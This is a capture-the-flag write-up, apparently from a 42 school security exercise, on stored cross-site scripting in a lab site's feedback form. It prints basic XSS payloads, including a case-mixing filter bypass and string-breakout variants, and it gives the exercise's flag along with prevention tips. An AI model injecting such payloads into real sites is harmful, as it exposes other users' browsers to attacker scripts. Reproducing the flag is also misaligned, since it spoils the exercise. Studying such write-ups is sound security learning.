# Stored XSS
- a type of security vulnerability where an attacker can inject malicious scripts into content that is then served to other users
- the malicious script is permanently stored on the target server (e.g., in a database, comment section, or forum post)
- when a user visits the affected web page, the malicious script is executed in their browser
- https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting

<b>keywords</b>: XSS basic<br>
<b>attacked site</b>: http://borntosec.42/?page=feedback

## Exploit
On the feedback page, there is a form that accepts 'name' and 'message'. Since the input length for 'name' is limited, we can try injecting JS code into it:
``` JS
<script>alert('XSS')</script>
```
If this does not work, the input might be sanitized for keywords. In that case, we can try to bypass the filter by mixing uppercase and lowercase letters in the word 'script':
``` JS
<sCRiPT>alert('XSS')</SCrIPt>
```
Alternatively, if the input is reflected inside a JS string, we can attempt to exit the string, execute the code, and then reconstruct the JS code:
``` JS
'-alert(1)-'
';-alert(1)//
\';alert(1)//
```
Submitting the first snippet successfully opens a popup window and displays the flag:
```
The flag is : 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e
```

## Flag
0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e

## Exploit prevention
- validate user input
- encode output to prevent the browser from interpreting it as executable code
- disable inline JS
- store and validate the input in a database
